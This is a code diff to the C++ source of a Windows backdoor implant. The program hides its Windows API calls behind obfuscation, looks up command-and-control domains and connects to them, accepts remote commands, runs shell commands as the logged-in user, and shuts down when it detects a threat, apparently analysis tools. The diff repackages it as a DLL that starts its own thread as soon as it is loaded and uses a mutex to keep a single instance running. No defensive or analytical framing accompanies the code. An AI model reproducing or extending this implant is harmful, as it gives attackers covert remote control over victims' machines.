@@ -1,8 +1,8 @@
 #include <iostream>
 #include <WS2tcpip.h>
 #include <windows.h>
-#include "TCPClient.h"
 #include "AutoHandle.h"
+#include "TCPClient.h"
 #include "utils.h"
 #include "commands.h"
 #include "obfuscate.h"
@@ -34,7 +34,6 @@ bool is_there_a_threat() {
 }
 
 
-
 DWORD close_client_on_threats(LPVOID client_pointer) {
     auto& client = *reinterpret_cast<TCPClient*>(client_pointer);
     while (client.m_is_connected) {
@@ -46,8 +45,6 @@ DWORD close_client_on_threats(LPVOID client_pointer) {
 }
 
 
-
-
 void get_command(TCPClient& client) {
     CreateThread(
         nullptr,
@@ -57,6 +54,8 @@ void get_command(TCPClient& client) {
         0,
         0
     );
+    get_module_handle_type get_module_handle = WINAPI_OBFUSCATE(get_module_handle_type, "GetModuleHandleW", "kernel32");
+    free_library_and_exit_thread_type free_library_and_exit_thread = WINAPI_OBFUSCATE(free_library_and_exit_thread_type, "FreeLibraryAndExitThread", "kernel32");
     client.reconnect();
     auto data = client.receive(4);
     switch ((*data)[0]) {
@@ -70,7 +69,7 @@ void get_command(TCPClient& client) {
         handle_shell_command_as_user(client);
         break;
     case 3: // Exit
-        ExitThread(0);
+        free_library_and_exit_thread(get_module_handle(nullptr), 0);
     default:
         client.send_data(OBFUSCATE("Unknown command"));
         break;
@@ -79,9 +78,24 @@ void get_command(TCPClient& client) {
     client.disconnect();
 }
 
-int main() {
+DWORD dll_main(LPVOID param) {
     initilize_winapi();
+    MessageBoxA(
+        nullptr,
+        "Started",
+        "",
+        0
+    );
     sleep_type sleep = WINAPI_OBFUSCATE(sleep_type, "Sleep", "kernel32");
+    create_mutex_a_type create_mutex_a = WINAPI_OBFUSCATE(create_mutex_a_type, "CreateMutexA", "kernel32");
+    AutoHandle mutex = create_mutex_a(
+        0,
+        false,
+        MUTEX_NAME
+    );
+    if (nullptr == mutex) {
+        return 0;
+    }
     std::string cnc_ip = "";
     while (cnc_ip == "") {
         for (const char* domain : CNC_DOMAINS) {
@@ -103,16 +117,19 @@ int main() {
     return 0;
 }
 
-BOOL APIENTRY DllMain(HMODULE hModule,
-    DWORD  ul_reason_for_call,
-    LPVOID lpReserved
-)
-{
+BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved) {
     switch (ul_reason_for_call)
     {
     case DLL_PROCESS_ATTACH:
+        CreateThread(
+            nullptr,
+            0,
+            dll_main,
+            nullptr,
+            0,
+            0
+        );
     case DLL_THREAD_ATTACH:
-        main();
     case DLL_THREAD_DETACH:
     case DLL_PROCESS_DETACH:
         break;
